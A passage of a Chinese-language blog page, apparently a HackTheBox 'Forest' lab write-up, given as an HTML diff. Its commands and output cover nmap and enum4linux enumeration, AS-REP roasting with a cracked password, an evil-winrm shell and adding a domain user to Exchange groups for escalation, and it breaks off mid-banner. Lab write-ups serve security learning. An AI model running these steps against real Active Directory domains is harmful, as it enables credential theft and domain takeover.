@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            HackTheBox-Forest |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">HackTheBox-Forest</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-07-17 11:31:00</span>
+        <span class="mobile">2020-07-17 11:31</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HackTheBox/">HackTheBox</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>hackthebox- Froest （考点：Kerberos pre-authentication&#x2F;win-rm&amp;5985&#x2F;域渗透）</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45527786/article/details/105558478" >https://blog.csdn.net/weixin_45527786/article/details/105558478<i class="fas fa-external-link-alt"></i></a></p>
+<p>扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -T4 -sS -sV -sC 10.10.10.161</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-04 02:15 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-04 07:23:52Z)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.80%I=7%D=3/4%Time=5E5F559D%P=x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,<span class="string">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span></span><br><span class="line"><span class="string">SF:04bind\0\0\x10\0\x03&quot;</span>);</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h48m17s, deviation: 4h37m10s, median: 8m15s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2020-03-03T23:26:20-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2020-03-04T07:26:18</span><br><span class="line">|_  start_date: 2020-03-04T05:20:04</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 299.81 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看到139、445端口开启，说明Samba服务在运行。于是使用enum4linux尝试枚举主机用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux -S -U 10.10.10.161</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> =========================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.10.161    |</span><br><span class="line"> =========================================== </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 359.</span><br><span class="line">Domain Name: HTB</span><br><span class="line">Domain Sid: S-1-5-21-3072663084-364016917-1341370565</span><br><span class="line">[+] Host is part of a domain (not a workgroup)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[<span class="variable">$331000</span>-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]</span><br><span class="line">user:[andy] rid:[0x47e]</span><br><span class="line">user:[mark] rid:[0x47f]</span><br><span class="line">user:[santi] rid:[0x480]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到域的名字为HTB。我们过滤出主机的用户名字典。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux -U 10.10.10.161 | <span class="built_in">tee</span> enum4linux.txt</span><br><span class="line">$ <span class="built_in">cat</span> enum4linux.txt | grep <span class="string">&quot;user:&quot;</span> | awk <span class="string">&#x27;&#123;split($0,a,&quot;[&quot; ); print a[2]&#125;&#x27;</span> | awk <span class="string">&#x27;&#123;split($0,b,&quot;]&quot; ); print b[1]&#125;&#x27;</span> &gt; userlist.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> users.txt | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | awk -F <span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; userlist.txt</span><br><span class="line"></span><br><span class="line">错误</span><br><span class="line"><span class="comment"># https://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html</span></span><br><span class="line">$ enum4linux -R 1000-50000 10.0.12.100 |<span class="built_in">tee</span> enum4linux.txt</span><br><span class="line">$ <span class="built_in">cat</span> enum4linux.txt | grep <span class="string">&#x27;(Local User)&#x27;</span> |awk <span class="string">&#x27;$2 ~ /MACFARLANE\\/ &#123;print $2&#125;&#x27;</span>| grep -vP <span class="string">&#x27;^.*?\$$&#x27;</span> | sed <span class="string">&#x27;s/MACFARLANE\\//g&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过GetNPUsers.py找其中用户列表中不需要Kerberos预身份验证的用户，发现用户svc-alfresco并获得其hash。不加<code>-format</code>参数默认生成的是hashcat格式的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python GetNPUsers.py HTB/ -usersfile /root/userlist.txt -format john -dc-ip 10.10.10.161</span><br><span class="line">...</span><br><span class="line">[-] User sebastien doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User lucinda doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep<span class="variable">$svc</span>-alfresco@HTB:32d83ad3aeac3898ec4fe24764a37f79<span class="variable">$33a0e1816aa4bef47b40636df342ebd304358a005bb31deac95f8416e8ff635bdfe2a0a0c1917fe0940665cd1c0086f314b5bbe72e5a4d27d6490d08ba5681b26259877978107facdb7d55a499883bc0e814be1efdc244d34bb26d01e2c6079c104ecc4ddbb3f821fc995881cc520523bcf3a1f4e6f265058a336f93d3790a640b54ccf29ab6e4bb407c8941e245821795b2d4ff3a07d7f57e4ae440fed0878e5740f234d6f0917fab497c54c7cf0673b8909d1c9610d4696a446ae08041471a36fe94366ffa6e2d2bb9bf27b71ecd96622eafaf79ef93788cd175ce0c2458e0</span></span><br><span class="line">[-] User andy doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User mark doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User santi doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User ak47 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<p>把hash保存成hash.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep<span class="variable">$svc</span>-alfresco@HTB:32d83ad3aeac3898ec4fe24764a37f79<span class="variable">$33a0e1816aa4bef47b40636df342ebd304358a005bb31deac95f8416e8ff635bdfe2a0a0c1917fe0940665cd1c0086f314b5bbe72e5a4d27d6490d08ba5681b26259877978107facdb7d55a499883bc0e814be1efdc244d34bb26d01e2c6079c104ecc4ddbb3f821fc995881cc520523bcf3a1f4e6f265058a336f93d3790a640b54ccf29ab6e4bb407c8941e245821795b2d4ff3a07d7f57e4ae440fed0878e5740f234d6f0917fab497c54c7cf0673b8909d1c9610d4696a446ae08041471a36fe94366ffa6e2d2bb9bf27b71ecd96622eafaf79ef93788cd175ce0c2458e0</span></span><br></pre></td></tr></table></figure>
+
+<p>使用john解密，加载rockyou.txt字典。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">s3rvice          ($krb5asrep<span class="variable">$svc</span>-alfresco@HTB)</span><br><span class="line">1g 0:00:00:11 DONE (2020-03-04 04:17) 0.08650g/s 353435p/s 353435c/s 353435C/s s3s1k2..s3rj12</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@localhost:~<span class="comment"># john --show hash.txt </span></span><br><span class="line">$krb5asrep<span class="variable">$svc</span>-alfresco@HTB:s3rvice</span><br><span class="line"></span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 0 left</span><br></pre></td></tr></table></figure>
+
+
+
+<p>hashcat破解：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.hackthebox.eu/discussion/2749/getnpusers-py-explained-video" >https://forum.hackthebox.eu/discussion/2749/getnpusers-py-explained-video<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html" >https://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec" >Crackmapexec<i class="fas fa-external-link-alt"></i></a>执行命令。</p>
+<p>evil-winrm</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://vulners.com/kitploit/KITPLOIT:1521717899068290187" >https://vulners.com/kitploit/KITPLOIT:1521717899068290187<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install winrm winrm-fs colorize stringio</span><br><span class="line">sudo gem install evil-winrm</span><br><span class="line"></span><br><span class="line">git clone https://github.com/Hackplayers/evil-winrm.git</span><br><span class="line">cd evil-winrm</span><br><span class="line">ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#x27;MySuperSecr3tPass123!&#x27; -s &#x27;/home/foo/ps1_scripts/&#x27; -e &#x27;/home/foo/exe_files/&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>使用evil-winrm连接主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 192.168.1.100 -u &lt;Username&gt; -p &lt;Password&gt; -s <span class="string">&#x27;/home/foo/ps1_scripts/&#x27;</span> -e <span class="string">&#x27;/home/foo/exe_files/&#x27;</span></span><br><span class="line"></span><br><span class="line">$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p <span class="string">&quot;s3rvice&quot;</span></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">htb\svc-alfresco</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; <span class="built_in">cd</span> ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">e5e4e47ae7022664cda6eb013fb0d9ed</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询域中的工作组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group /domain</span><br><span class="line"></span><br><span class="line">Group Accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">*<span class="variable">$D31000</span>-NSEL5BRJ63V7</span><br><span class="line">*Cloneable Domain Controllers</span><br><span class="line">*Compliance Management</span><br><span class="line">*Delegated Setup</span><br><span class="line">*Discovery Management</span><br><span class="line">*DnsUpdateProxy</span><br><span class="line">*Domain Admins</span><br><span class="line">*Domain Computers</span><br><span class="line">*Domain Controllers</span><br><span class="line">*Domain Guests</span><br><span class="line">*Domain Users</span><br><span class="line">*Enterprise Admins</span><br><span class="line">*Enterprise Key Admins</span><br><span class="line">*Enterprise Read-only Domain Controllers</span><br><span class="line">*Exchange Servers</span><br><span class="line">*Exchange Trusted Subsystem</span><br><span class="line">*Exchange Windows Permissions</span><br><span class="line">*ExchangeLegacyInterop</span><br><span class="line">*Group Policy Creator Owners</span><br><span class="line">*Help Desk</span><br><span class="line">*Hygiene Management</span><br><span class="line">*Key Admins</span><br><span class="line">*Managed Availability Servers</span><br><span class="line">*Organization Management</span><br><span class="line">*Privileged IT Accounts</span><br><span class="line">*Protected Users</span><br><span class="line">*Public Folder Management</span><br><span class="line">*Read-only Domain Controllers</span><br><span class="line">*Recipient Management</span><br><span class="line">*Records Management</span><br><span class="line">*Schema Admins</span><br><span class="line">*Security Administrator</span><br><span class="line">*Security Reader</span><br><span class="line">*Server Management</span><br><span class="line">*Service Accounts</span><br><span class="line">*<span class="built_in">test</span></span><br><span class="line">*UM Management</span><br><span class="line">*View-Only Organization Management</span><br><span class="line">The <span class="built_in">command</span> completed with one or more errors.</span><br></pre></td></tr></table></figure>
+
+<p>查看组信息时发现Exchange，尝试通过Exchange的默认高权限提权。</p>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" >https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/<i class="fas fa-external-link-alt"></i></a></p>
+<p>或者直接搜索CVE-2018-8581</p>
+<p>开始提权<br>可以直接用svc-alfresco这个用户进行一系列给权限操作。<br>不过我为了更好体验这些不同组的权限分工，来更熟悉域环境。我自己弄个新小弟用户走全程。我先自己增一个用户pkp，密码pkp666！，再加到域的exchange组里。bypass用来绕过我传powerview进来的限制。有了powerview的帮助我才能给自己加dscync的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user pkp pkp666! /add /domain</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> pkp /add</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup <span class="string">&quot;Remote Management Users&quot;</span> pkp /add</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; menu</span><br><span class="line"></span><br><span class="line">   ,.   (   .      )               <span class="string">&quot;            ,.   (   .      )       .   </span></span><br><span class="line"><span class="string">  (&quot;</span>  (  )  )<span class="string">&#x27;     ,&#x27;</span>             (`     <span class="string">&#x27;`    (&quot;     )  )&#x27;</span>     ,<span class="string">&#x27;   .  ,)  </span></span><br><span class="line"><span class="string">.; )  &#x27;</span> (( (<span class="string">&quot; )    ;(,      .     ;)  &quot;</span>  )<span class="string">&quot;  .; )  &#x27; (( (&quot;</span> )   );(,   )((   </span><br><span class="line">_<span class="string">&quot;.,_,.__).,) (.._( ._),     )  , (._..( &#x27;.._&quot;</span>._, . <span class="string">&#x27;._)_(..,_(_&quot;.) _( _&#x27;</span>)  </span><br><span class="line">\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  </span><br><span class="line"> |    __)_\  \/ /  |  |    ;_)_<span class="string">&#x27;) \   \/\/   /  |/    \|       _/ /  \ /  \ </span></span><br><span class="line"><span class="string"> |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \</span></span><br><span class="line"><span class="string">/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /</span></span><br><span 